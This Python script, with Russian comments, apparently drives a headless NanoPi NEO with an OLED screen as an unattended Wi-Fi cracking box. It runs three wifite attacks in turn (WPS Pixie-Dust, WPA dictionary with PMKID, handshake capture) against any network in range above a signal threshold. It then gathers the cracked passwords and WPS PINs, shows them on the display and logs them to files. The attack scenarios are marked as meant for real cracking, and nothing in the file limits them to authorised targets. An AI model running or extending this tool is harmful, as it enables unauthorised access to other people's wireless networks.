#!/usr/bin/env python3
"""
WiFi Audit Tool with OLED Display
NanoPi NEO + SSD1306 128x64
Универсальная версия с автоопределением путей
"""

import subprocess
import re
import time
import os
import json
from datetime import datetime
from luma.core.interface.serial import i2c
from luma.core.render import canvas
from luma.oled.device import ssd1306

# ============================================================================
# === НАСТРОЙКИ (автоматические пути) =========================================
# ============================================================================

# === АВТОМАТИЧЕСКОЕ ОПРЕДЕЛЕНИЕ ПУТЕЙ ===
HOME_DIR = os.path.expanduser("~")              # Домашняя папка пользователя
CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))  # Папка со скриптом

INTERFACE = "wlan0"                             # WiFi интерфейс

# === Словарь паролей ===
# Оставьте пустым "" для использования встроенного словаря wifite
# Или укажите путь: "/usr/share/dict/passwords.txt"
DICTIONARY = ""                                 # Пусто = встроенный словарь wifite

# === Пути к файлам (автоматические) ===
LOG_FILE = os.path.join(HOME_DIR, "wifite_full_log.txt")
CRACKED_FILE = os.path.join(HOME_DIR, "cracked.json")

WIFITE_POWER = 40                               # Мин. мощность сигнала (dbm)
WIFITE_SCAN_TIME = 60                           # Время сканирования (секунды)

CHECK_INTERVAL = 30                             # Проверка результатов каждые N сек
OLED_UPDATE_INTERVAL = 5                        # Обновление экрана каждые N сек

# --- Настройки логов на OLED ---
OLED_LOG_LINES = 4                              # Сколько строк логов показывать
OLED_LOG_MAX_LEN = 21                           # Макс. длина строки (символов)

SHOW_DATE_ON_START = True                       # Показывать дату/время при старте
SHOW_CRACKED_TIME = True                        # Показывать когда найден пароль

# ============================================================================
# === КОНЕЦ НАСТРОЕК ==========================================================
# ============================================================================

# === Функция для построения команды wifite ===
def build_wifite_cmd(base_cmd, include_dict=True):
    """Строит команду wifite, добавляя --dict только если словарь указан"""
    cmd = base_cmd.copy()
    if include_dict and DICTIONARY and DICTIONARY.strip():
        cmd.extend(["--dict", DICTIONARY])
    return cmd

# === Три сценария атак (БЕЗ --skip-crack для реального взлома) ===
ATTACK_SCENARIOS = [
    {
        "name": "WPS Pixie-Dust",
        "cmd": build_wifite_cmd([
            "sudo", "wifite",
            "-i", INTERFACE,
            "--pow", str(WIFITE_POWER),
            "-p", str(WIFITE_SCAN_TIME),
            "--pixie",
            "--no-pmkid",
            "--wps-only",
            "-ic"
        ], include_dict=False)  # WPS не нуждается в словаре
    },
    {
        "name": "WPA Dict + PMKID",
        "cmd": build_wifite_cmd([
            "sudo", "wifite",
            "-i", INTERFACE,
            "--pow", str(WIFITE_POWER),
            "-p", str(WIFITE_SCAN_TIME),
            "--no-wps",
            "-ic"
        ], include_dict=True)  # Словарь нужен
    },
    {
        "name": "WPA Dict (HS Only)",
        "cmd": build_wifite_cmd([
            "sudo", "wifite",
            "-i", INTERFACE,
            "--pow", str(WIFITE_POWER),
            "-p", str(WIFITE_SCAN_TIME),
            "--no-wps",
            "--clients-only",
            "--no-pmkid",
            "-ic"
        ], include_dict=True)  # Словарь нужен
    }
]

# === Инициализация OLED ===
serial = i2c(port=0, address=0x3C)
device = ssd1306(serial, width=128, height=64)

# === Глобальные переменные ===
already_shown_networks = set()
cracked_networks_with_time = {}
attack_start_time = None
recent_logs = []

def draw_oled(mode, data=None):
    """Умный вывод на OLED с приоритетами"""
    try:
        with canvas(device) as draw:
            draw.rectangle((0, 0, 127, 10), fill=255, outline=0)
            
            if mode == 'cracked':
                draw.text((2, 1), "!!! CRACKED !!!", fill=0)
                draw.text((2, 13), f"SSID: {data.get('essid', 'Unknown')[:18]}", fill=255)
                draw.text((2, 23), f"KEY:  {data.get('key', 'Unknown')[:18]}", fill=255)
                draw.text((2, 33), f"Time: {data.get('time', '')}", fill=255)
                
            elif mode == 'attack':
                draw.text((2, 1), data.get('title', 'ATTACK')[:18], fill=0)
                draw.text((2, 13), f"Target: {data.get('target', 'Scanning...')[:18]}", fill=255)
                draw.text((2, 23), f"Cur: {data.get('cur_time', '00m00s')}", fill=255)
                draw.text((2, 33), f"Tot: {data.get('tot_time', '00m00s')}", fill=255)
                
            elif mode == 'logs':
                draw.text((2, 1), "LOGS", fill=0)
                logs = data.get('logs', []) if data else []
                display_logs = logs[-OLED_LOG_LINES:]
                y_positions = [12, 22, 32, 42]
                for i, log_line in enumerate(display_logs):
                    if i < len(y_positions):
                        draw.text((2, y_positions[i]), log_line[:OLED_LOG_MAX_LEN], fill=255)
                    
            elif mode == 'results':
                draw.text((2, 1), "RESULTS", fill=0)
                draw.text((2, 13), f"Found: {data.get('count', 0)} networks", fill=255)
                if data.get('networks') and len(data['networks']) > 0:
                    draw.text((2, 23), f"{data['networks'][0][:18]}", fill=255)
                draw.text((2, 33), f"Time: {data.get('tot_time', '')}", fill=255)
                
            elif mode == 'error':
                draw.text((2, 1), "ERROR", fill=0)
                draw.text((2, 13), data.get('message', 'Unknown error')[:18], fill=255)
                draw.text((2, 23), data.get('details', '')[:18], fill=255)
                
            else:
                draw.text((2, 1), "WiFi Audit", fill=0)
                draw.text((2, 13), "Ready", fill=255)
                draw.text((2, 23), f"Start: {attack_start_time}", fill=255)
            
            footer = f"{get_current_datetime()} | {WIFITE_POWER}dbm"
            draw.rectangle((0, 50, 127, 60), fill=0, outline=0)
            draw.text((2, 51), footer[:19], fill=255)
            
    except Exception as e:
        print(f"[OLED ERROR] {e}")

def add_to_logs(line):
    """Добавляет строку в буфер логов"""
    global recent_logs
    clean_line = strip_ansi(line).strip()
    if not clean_line:
        return
    if clean_line.startswith('.') or clean_line.startswith(':') or clean_line.startswith('`'):
        return
    if 'wifite' in clean_line.lower() and 'http' in clean_line.lower():
        return
    if len(clean_line) > 0:
        recent_logs.append(clean_line)
        if len(recent_logs) > 15:
            recent_logs.pop(0)

def strip_ansi(text):
    try:
        ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
        return ansi_escape.sub('', text).strip()
    except:
        return text

def get_current_datetime():
    now = datetime.now()
    return now.strftime("%d.%m %H:%M")

def get_full_datetime():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S")

def format_elapsed_time(seconds):
    hours = int(seconds // 3600)
    minutes = int((seconds % 3600) // 60)
    secs = int(seconds % 60)
    if hours > 0:
        return f"{hours:02d}h{minutes:02d}m{secs:02d}s"
    else:
        return f"{minutes:02d}m{secs:02d}s"

def find_wifi_interfaces():
    try:
        result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
        interfaces = []
        for line in result.stdout.split('\n'):
            if 'IEEE 802.11' in line:
                iface = line.split()[0]
                interfaces.append(iface)
        return interfaces
    except:
        return []

def check_interface_exists(iface):
    try:
        result = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except:
        return False

def find_cracked_json():
    """Ищет cracked.json в нескольких местах"""
    possible_paths = [
        CRACKED_FILE,
        os.path.join(HOME_DIR, "cracked.json"),
        "/root/cracked.json",
        "/root/.wifite/cracked.json",
        os.path.expanduser("~/.wifite/cracked.json"),
        os.path.join(CURRENT_DIR, "cracked.json"),
        "/tmp/cracked.json"
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

def get_cracked_from_json():
    json_path = find_cracked_json()
    if not json_path:
        return []
    try:
        with open(json_path, 'r') as f:
            data = json.load(f)
        networks = []
        items = []
        if isinstance(data, list):
            items = data
        elif isinstance(data, dict):
            items = data.get('targets', [data])
        else:
            return []
        for i, item in enumerate(items):
            try:
                if not isinstance(item, dict):
                    continue
                essid = ''
                for key in ['essid', 'ESSID', 'name', 'ssid', 'SSID']:
                    if key in item and item[key]:
                        essid = str(item[key])[:15]
                        break
                if not essid:
                    essid = 'Unknown'
                key = ''
                for key_name in ['key', 'KEY', 'password', 'PASSWORD', 'wps_pin', 'WPS_PIN', 
                                'pin', 'PIN', 'passphrase', 'PASSPHRASE', 'pw', 'PW']:
                    if key_name in item and item[key_name]:
                        key = str(item[key_name])[:15]
                        break
                if key and len(key) >= 4:
                    networks.append({'essid': essid, 'key': key})
            except:
                continue
        return networks
    except:
        return []

def get_cracked_from_wifite_cmd():
    try:
        result = subprocess.run(
            ["sudo", "wifite", "--cracked"],
            capture_output=True,
            text=True,
            timeout=3
        )
        output = strip_ansi(result.stdout)
        networks = []
        lines = output.split('\n')
        for line in lines:
            try:
                line = line.strip()
                if len(line) < 15:
                    continue
                if 'PIN:' in line or 'KEY:' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        essid = parts[0]
                        key = ""
                        for i, p in enumerate(parts):
                            if p == 'PIN:' and i+1 < len(parts):
                                key = parts[i+1]
                                break
                            elif p == 'KEY:' and i+1 < len(parts):
                                key = parts[i+1]
                                break
                        if key:
                            networks.append({'essid': essid[:15], 'key': key[:15]})
            except:
                continue
        return networks
    except:
        return []

def get_all_cracked_networks():
    all_networks = []
    json_networks = get_cracked_from_json()
    all_networks.extend(json_networks)
    cmd_networks = get_cracked_from_wifite_cmd()
    all_networks.extend(cmd_networks)
    unique = []
    seen = set()
    for net in all_networks:
        net_id = f"{net['essid']}_{net['key']}"
        if net_id not in seen:
            seen.add(net_id)
            unique.append(net)
    return unique

def update_oled_display(scenario_name, current_elapsed, total_elapsed, networks, cracked_net=None, show_logs=False):
    """Умное обновление OLED на основе приоритетов"""
    if cracked_net:
        draw_oled('cracked', {
            'essid': cracked_net['essid'],
            'key': cracked_net['key'],
            'time': get_current_datetime()
        })
        return
    if show_logs:
        draw_oled('logs', {'logs': recent_logs})
        return
    if scenario_name:
        target = "Scanning..."
        if networks and len(networks) > 0:
            target = f"{len(networks)} networks"
        draw_oled('attack', {
            'title': scenario_name[:18],
            'target': target,
            'cur_time': format_elapsed_time(current_elapsed) if current_elapsed else '00m00s',
            'tot_time': format_elapsed_time(total_elapsed) if total_elapsed else '00m00s'
        })
        return
    if networks is not None:
        draw_oled('results', {
            'count': len(networks),
            'networks': [n['essid'] for n in networks] if networks else [],
            'tot_time': format_elapsed_time(total_elapsed) if total_elapsed else '00m00s'
        })
        return
    draw_oled('default', {})

def check_and_show_cracked(total_start, scenario_name, current_elapsed, total_elapsed):
    """Проверяет взломанные сети и обновляет OLED"""
    global already_shown_networks, cracked_networks_with_time
    networks = get_all_cracked_networks()
    current_time = get_current_datetime()
    for net in networks:
        net_id = f"{net['essid']}_{net['key']}"
        if net_id not in cracked_networks_with_time:
            cracked_networks_with_time[net_id] = current_time
    new_networks = []
    for net in networks:
        net_id = f"{net['essid']}_{net['key']}"
        if net_id not in already_shown_networks:
            already_shown_networks.add(net_id)
            new_networks.append(net)
    if new_networks:
        for net in new_networks:
            print(f"\n[+] *** CRACKED: {net['essid']} - {net['key']} ***")
            for i in range(3):
                update_oled_display(None, None, None, None, cracked_net=net)
                time.sleep(0.5)
            time.sleep(2)
        return True
    return False

def show_final_results(networks, total_elapsed, reason="DONE"):
    if networks:
        update_oled_display('results', None, total_elapsed, networks)
        time.sleep(2)
        for i, net in enumerate(networks):
            crack_time = cracked_networks_with_time.get(f"{net['essid']}_{net['key']}", '')
            update_oled_display('results', None, total_elapsed, networks)
            print(f"[+] Result {i+1}: {net['essid']} - {net['key']} (at {crack_time})")
            time.sleep(5)
        update_oled_display('results', None, total_elapsed, networks)
    else:
        update_oled_display('results', None, total_elapsed, networks)
    time.sleep(10)

def run_attack(scenario, scenario_num, total_scenarios, f_log, total_start):
    print("\n" + "=" * 60)
    print(f"ATTACK {scenario_num}/{total_scenarios}: {scenario['name']}")
    print("=" * 60)
    start_time = time.time()
    last_check = time.time()
    last_oled_update = time.time()
    oled_mode_cycle = 0
    try:
        process = subprocess.Popen(
            scenario['cmd'],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                clean = strip_ansi(output)
                print(clean, flush=True)
                f_log.write(f"[{scenario['name']}] {clean}\n")
                add_to_logs(clean)
                if time.time() - last_oled_update >= OLED_UPDATE_INTERVAL:
                    current_elapsed = time.time() - start_time
                    total_elapsed = time.time() - total_start
                    oled_mode_cycle += 1
                    if oled_mode_cycle % 2 == 0:
                        update_oled_display(None, None, None, None, show_logs=True)
                    else:
                        update_oled_display(scenario['name'], current_elapsed, total_elapsed, None)
                    last_oled_update = time.time()
                if time.time() - last_check >= CHECK_INTERVAL:
                    current_elapsed = time.time() - start_time
                    total_elapsed = time.time() - total_start
                    check_and_show_cracked(total_start, scenario['name'], current_elapsed, total_elapsed)
                    last_check = time.time()
        current_elapsed = time.time() - start_time
        total_elapsed = time.time() - total_start
        update_oled_display(scenario['name'], current_elapsed, total_elapsed, None)
        elapsed = time.time() - start_time
        print(f"[+] {scenario['name']} finished in {format_elapsed_time(elapsed)}")
        return elapsed
    except Exception as e:
        print(f"[-] Error in {scenario['name']}: {e}")
        f_log.write(f"[ERROR] {scenario['name']}: {e}\n")
        draw_oled('error', {'message': 'ERROR', 'details': str(e)[:18]})
        time.sleep(3)
        return 0

def main():
    global already_shown_networks, attack_start_time
    total_start = time.time()
    attack_start_time = get_current_datetime()
    
    print("=" * 60)
    print("WiFi Audit - Full 3-Stage Test")
    print("=" * 60)
    print(f"Start time: {get_full_datetime()}")
    print(f"Attack started: {attack_start_time}")
    print(f"Home directory: {HOME_DIR}")
    print(f"Script directory: {CURRENT_DIR}")
    print(f"Interface: {INTERFACE}")
    print(f"Power: {WIFITE_POWER} dbm | Scan time: {WIFITE_SCAN_TIME}s")
    print(f"Dictionary: {DICTIONARY if DICTIONARY else '(wifite default)'}")
    print(f"Log file: {LOG_FILE}")
    print("=" * 60)
    
    if SHOW_DATE_ON_START:
        now = datetime.now()
        draw_oled('default', {})
        print(f"[OLED] Showing start screen for 3 seconds...")
        time.sleep(3)
    
    print(f"\n[+] Checking WiFi interface {INTERFACE}...")
    
    if not check_interface_exists(INTERFACE):
        print(f"[-] ERROR: Interface {INTERFACE} not found!")
        draw_oled('error', {'message': f'{INTERFACE} missing!', 'details': 'Check adapter'})
        time.sleep(3)
        available = find_wifi_interfaces()
        if available:
            print(f"[+] Available WiFi interfaces: {', '.join(available)}")
            draw_oled('error', {'message': f'FOUND {len(available)} iface', 'details': ', '.join(available)[:18]})
            time.sleep(10)
        else:
            print("[-] No WiFi interfaces found in system!")
            draw_oled('error', {'message': 'No WiFi', 'details': 'Check hardware'})
            time.sleep(10)
        return
    
    print(f"[+] Interface {INTERFACE} OK!")
    draw_oled('default', {})
    time.sleep(3)
    
    try:
        with open(LOG_FILE, "w") as f_log:
            f_log.write(f"=== WiFi Audit Started: {get_full_datetime()} ===\n")
            f_log.write(f"Attack started: {attack_start_time}\n")
            f_log.write(f"Home: {HOME_DIR}\n")
            f_log.write(f"Interface: {INTERFACE}\n")
            f_log.write(f"Power: {WIFITE_POWER} dbm | Scan time: {WIFITE_SCAN_TIME}s\n")
            f_log.write(f"Dictionary: {DICTIONARY if DICTIONARY else '(wifite default)'}\n\n")
            total_attack_time = 0
            for i, scenario in enumerate(ATTACK_SCENARIOS, 1):
                duration = run_attack(scenario, i, len(ATTACK_SCENARIOS), f_log, total_start)
                total_attack_time += duration
                if i < len(ATTACK_SCENARIOS):
                    for countdown in range(5, 0, -1):
                        draw_oled('attack', {'title': 'PAUSE', 'target': f'Next in {countdown}s', 'cur_time': '', 'tot_time': ''})
                        time.sleep(1)
            total_elapsed = time.time() - total_start
            print("\n" + "=" * 60)
            print("ALL TESTS COMPLETED")
            print(f"Total time: {format_elapsed_time(total_elapsed)}")
            print(f"Finished at: {get_full_datetime()}")
            print("=" * 60)
            print("\n[+] Getting final cracked results...")
            networks = get_all_cracked_networks()
            f_log.write("\n=== CRACKED RESULTS ===\n")
            f_log.write(f"Networks: {len(networks)}\n")
            for net in networks:
                crack_time = cracked_networks_with_time.get(f"{net['essid']}_{net['key']}", 'Unknown')
                f_log.write(f"  {net['essid']} : {net['key']} (at {crack_time})\n")
            show_final_results(networks, total_elapsed, "DONE")
            print(f"\nLog saved to: {LOG_FILE}")
            print("=" * 60)
    except KeyboardInterrupt:
        total_elapsed = time.time() - total_start
        print("\n[!] Stopped by user")
        draw_oled('error', {'message': 'STOPPED', 'details': 'By User'})
        time.sleep(2)
        print("[+] Waiting for wifite to release locks (3 sec)...")
        for i in range(3, 0, -1):
            print(f"    {i}...")
            time.sleep(1)
        print("\n[+] Getting cracked results before exit...")
        networks = get_all_cracked_networks()
        try:
            with open(LOG_FILE, "a") as f_log:
                f_log.write("\n=== STOPPED BY USER ===\n")
                f_log.write(f"Time: {format_elapsed_time(total_elapsed)}\n")
                f_log.write(f"Stopped at: {get_full_datetime()}\n")
                f_log.write(f"Networks found: {len(networks)}\n")
                for net in networks:
                    crack_time = cracked_networks_with_time.get(f"{net['essid']}_{net['key']}", 'Unknown')
                    f_log.write(f"  {net['essid']} : {net['key']} (at {crack_time})\n")
        except:
            pass
        show_final_results(networks, total_elapsed, "STOPPED")
    except Exception as e:
        draw_oled('error', {'message': 'ERROR', 'details': str(e)[:18]})
        print(f"\n[ERROR] {e}")
        time.sleep(5)

if __name__ == "__main__":
    main()
